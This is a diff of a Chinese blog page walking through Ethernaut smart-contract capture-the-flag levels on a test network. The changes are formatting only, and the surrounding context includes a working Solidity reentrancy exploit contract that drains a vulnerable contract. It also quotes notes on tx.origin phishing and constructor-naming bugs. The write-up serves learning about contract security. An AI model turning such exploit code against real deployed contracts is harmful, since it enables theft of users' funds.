@@ -9,7 +9,7 @@
 
 
 
-    <meta charset="utf-8">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     
     
     
@@ -76,13 +76,13 @@
     <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
     <script>window.lazyScripts=[]</script>
 
-    <!-- custom head -->
+    <!-- custom head --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
     
 
 </head>
 
 <body>
-    <div id="loading" class="active"></div>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
 
     <aside id="menu" class="hide">
   <div class="inner flex-row-vertical">
@@ -238,13 +238,19 @@
                     <img src="/2019/01/08/ethernautd训练/2.jpg" alt="合约地址" title="">
                 </div>
                 <div class="image-caption">合约地址</div>
-            </figure></div><br><div style="width: 50%; margin: auto"><figure class="image-bubble">
+            </figure></div>
+<div style="width: 50%; margin: auto"><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="/2019/01/08/ethernautd训练/3.jpg" alt="help" title="">
                 </div>
                 <div class="image-caption">help</div>
-            </figure></div><br>其中level地址为 <code>0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c</code><br><br>在Ropsten测试网络下还会有你的player地址和Ethernaut地址<br>使用player指令可以直接获得player地址<br><div style="width: 50%; margin: auto"><figure class="image-bubble">
+            </figure></div>
+其中level地址为 `0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c`
+
+在Ropsten测试网络下还会有你的player地址和Ethernaut地址
+使用player指令可以直接获得player地址
+<div style="width: 50%; margin: auto"><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="/2019/01/08/ethernautd训练/4.jpg" alt="player地址和Ethernaut地址" title="">
@@ -287,7 +293,9 @@
                     <img src="/2019/01/08/ethernautd训练/8.jpg" alt="获取实例按钮" title="">
                 </div>
                 <div class="image-caption">获取实例按钮</div>
-            </figure></div><br>成功之后会显示下图<br><div style="width: 50%; margin: auto"><figure class="image-bubble">
+            </figure></div>
+成功之后会显示下图
+<div style="width: 50%; margin: auto"><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="/2019/01/08/ethernautd训练/9.jpg" alt="成功" title="">
@@ -303,13 +311,15 @@
                     <img src="/2019/01/08/ethernautd训练/10.jpg" alt="10" title="">
                 </div>
                 <div class="image-caption">10</div>
-            </figure></div><br><div style="width: 50%; margin: auto"><figure class="image-bubble">
+            </figure></div>
+<div style="width: 50%; margin: auto"><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="/2019/01/08/ethernautd训练/11.jpg" alt="11" title="">
                 </div>
                 <div class="image-caption">11</div>
-            </figure></div><br><div style="width: 50%; margin: auto"><figure class="image-bubble">
+            </figure></div>
+<div style="width: 50%; margin: auto"><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="/2019/01/08/ethernautd训练/12.jpg" alt="12" title="">
@@ -362,7 +372,7 @@
 
 
 <p>4.点击<code>submit instance</code>即可过关。</p>
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号<em>(:зゝ∠)</em></p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号_(:зゝ∠)_</p>
 <h3 id="通关后的彩蛋-1"><a href="#通关后的彩蛋-1" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
 <p>You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.<br>You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.<br>Move on to the next level when you’re ready!</p>
 </blockquote>
@@ -393,8 +403,6 @@
 <p>3.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-2"><a href="#通关后的彩蛋-2" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
 <p>That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?<br>Well… Not quite.<br>The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract Rubixi &#123;</span><br><span class="line">&gt;         address private owner;</span><br><span class="line">&gt;         function DynamicPyramid() &#123; owner = msg.sender; &#125;</span><br><span class="line">&gt;         function collectAllFees() &#123; owner.transfer(this.balance) &#125;</span><br><span class="line">&gt;         ...</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
 <p>This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.</p>
 </blockquote>
 <hr>
@@ -466,11 +474,7 @@
 <p>5.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-4"><a href="#通关后的彩蛋-4" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
 <p>While this example may be simple, confusing <code>tx.origin</code> with <code>msg.sender</code> can lead to phishing-style attacks, such as <a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/" target="_blank" rel="noopener">this</a>.<br>An example of a possible attack is outlined below.<br>1.Use <code>tx.origin</code> to determine whose tokens to transfer, e.g.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; function transfer(address _to, uint _value) &#123;</span><br><span class="line">&gt;   tokens[tx.origin] -= _value;</span><br><span class="line">&gt;   tokens[_to] += _value;</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
 <p>2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; function () payable &#123;</span><br><span class="line">&gt;   token.transfer(attackerAddress, 10000);</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
 <p>In this scenario, <code>tx.origin</code> will be the victim’s address (while <code>msg.sender</code> will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker.</p>
 </blockquote>
 <hr>
@@ -500,11 +504,7 @@
 <p>3.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-5"><a href="#通关后的彩蛋-5" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
 <p>Overflows are very common in solidity and must be checked for with control statements such as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; if(a + c &gt; a) &#123;</span><br><span class="line">&gt;   a = a + c;</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
 <p>An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; a = a.add(c);</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
 <p>If there is an overflow, the code will revert.</p>
 </blockquote>
 <hr>
@@ -631,7 +631,7 @@
                     <img src="/2019/01/08/ethernautd训练/39.jpg" alt="39" title="">
                 </div>
                 <div class="image-caption">39</div>
-            </figure><br>所以我们可以利用这个机制编写合约将钱全部提出。</p>
+            </figure>&lt;/div&gt;<br>所以我们可以利用这个机制编写合约将钱全部提出。</p>
 <h3 id="具体步骤-9"><a href="#具体步骤-9" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0xdc8941b8396a3140b008d124fcd149acd2005eff</span>;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function exp() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        //同理写两次</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>2.调用<code>donate</code>方法捐款<code>2ETH</code></p>
 <div style="width: 50%; margin: auto"><figure class="image-bubble">
@@ -649,7 +649,9 @@
                     <img src="/2019/01/08/ethernautd训练/41.jpg" alt="41" title="">
                 </div>
                 <div class="image-caption">41</div>
-            </figure></div><br>攻击后的结果<br><div style="width: 50%; margin: auto"><figure class="image-bubble">
+            </figure></div>
+攻击后的结果
+<div style="width: 50%; margin: auto"><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="/2019/01/08/ethernautd训练/42.jpg" alt="42" title="">
@@ -660,8 +662,6 @@
 <p>4.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-10"><a href="#通关后的彩蛋-10" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
 <p>Use <code>transfer</code> to move funds out of your contract, since it <code>throws</code> and limits gas forwarded. Low level functions like <code>call</code> and <code>send</code> just return false but don’t interrupt the execution flow when the receiving contract fails.<br>Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.<br>Re-entrancy is a common attack. You should always be prepared for it!</p>
-</blockquote>
-<blockquote>
 <p><strong>The DAO Hack</strong><br>The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See <a href="https://blog.zeppelin.solutions/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942" target="_blank" rel="noopener">15 lines of code that could have prevented TheDAO Hack.</a></p>
 </blockquote>
 <hr>
@@ -860,7 +860,7 @@ var BLOG = { ROOT: '/', SHARE: false, REWARD: false };
 
 
 
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 
 
